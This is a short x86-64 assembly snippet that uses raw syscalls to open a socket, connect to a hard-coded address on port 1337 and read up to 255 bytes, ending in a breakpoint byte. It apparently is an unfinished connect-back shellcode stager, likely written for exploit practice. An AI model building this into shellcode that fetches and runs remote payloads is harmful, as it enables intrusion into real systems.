global _start
_start:
	mov rbp, rsp
	sub rsp, 350
	mov rax, 41
	mov edx, 0
	mov esi, 1
	mov edi, 2
	syscall ; socket function

	mov [rbp], rax; [rbp] -> fd
	mov dword [rbp-20], 0x39050002
	mov dword [rbp-16], 0x144b7c0d
	mov dword [rbp-12], 0x55554660
	mov dword [rbp-8], 0x00005555
	mov rax, 42
	mov rdi, [rbp] ;maybe 3
	lea rsi, [rbp-20] ; [rbp-20] -> clientaddr
	;mov rsi, rbp
	;sub rsi, 20
	mov rdx, 16
	syscall ;connect

	mov rax, 0
	mov rdi, [rbp]
	lea rsi, [rbp-300]; [rbp-300] -> read buffer
	mov rdx, 255
	syscall ;read



db 0xcc